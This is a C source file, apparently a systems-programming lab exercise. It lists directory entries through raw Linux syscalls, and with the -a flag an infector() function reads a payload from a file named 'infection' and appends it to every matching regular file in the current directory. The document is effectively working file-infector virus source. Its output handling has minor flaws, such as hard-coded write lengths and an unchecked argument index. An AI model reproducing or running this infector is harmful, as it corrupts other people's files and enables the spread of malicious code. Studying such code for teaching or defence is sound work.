#include "util.h"
#include <dirent.h>

#define STDIN	 0
#define STDOUT 1
#define DT_REG 8  

/*System function numbers. */
#define SYS_EXIT  1 
#define SYS_READ  3
#define SYS_WRITE 4
#define SYS_OPEN  5
#define SYS_LSEEK 19
#define SYS_GETDENTS 141

void writeOut(char * str, int length);
void infector(char * filename);
extern int system_call();

 struct linux_dirent {
    long d_ino;
    long d_off;
    unsigned short d_reclen;
    char d_name[];
 } linux_dirent;

int flagS = 0;
int flagA = 0;

char * _flagS = " ";
int main (int argc , char* argv[], char* envp[]) {
  int i;
  for(i=1; i<argc; i++){
    if(strcmp(argv[i],"-s") == 0) {
      flagS=1;
      _flagS = argv[i+1];
      i++;
    }
    else if(strcmp(argv[i],"-a") == 0) {
      flagA=1;
      flagS=1;
      _flagS = argv[i+1];
      i++;
    }
    else {
      writeOut("invalid parameter", 14);
      return 1;
    }
  }

	writeOut("\n", 1);
	int fd, bpos;
	char * dirname = ".";
	char buffer[8192];
	struct linux_dirent * d;
  fd = system_call(SYS_OPEN, dirname, 0, 0777);	
	int count = system_call(SYS_GETDENTS, fd, buffer, 8192);
  char d_type;		
  
  writeOut("Name:\n", 6);
  writeOut("-----------------------------\n", 30);
  for (bpos = 0; bpos < count;) {
    d = (struct linux_dirent *) (buffer + bpos);
    d_type = *(buffer + bpos + d->d_reclen - 1);
    bpos += d->d_reclen;
    if (flagS == 0 || (flagS == 1 && d_type == DT_REG && strcmp(d->d_name+strlen(d->d_name) -1, _flagS) == 0)) {
      writeOut(d->d_name, strlen(d->d_name));
      writeOut("\n", 1);
      if (flagA == 1) {
        infector(d->d_name);
      }
    }
	}
	
	writeOut("\n", 1);
	return 0;
}

void writeOut(char * str, int length) {
  system_call(SYS_WRITE, STDOUT, str, length);
}


char virus_data[20000] = " ";
int virus_size = 0;

/* One-time op, read the virus data */
void read_virus() {
  writeOut("reading virus\n", 14);
  int file = system_call(SYS_OPEN, "infection", 2, 0777);
  virus_size = system_call(SYS_READ, file, virus_data, 20000);
}

void infector(char * filename) {
  if (virus_size  <= 0) {
    read_virus();
  }

  int result = 0;
  int file = system_call(SYS_OPEN, filename, 64 | 2 | 1024, 0777);
  result = system_call(SYS_LSEEK, file, 0, 2);
  writeOut(itoa(result), 4);
  writeOut("\n", 1);
  result = system_call(SYS_WRITE, file, virus_data, virus_size);
  writeOut(itoa(result), 2);
}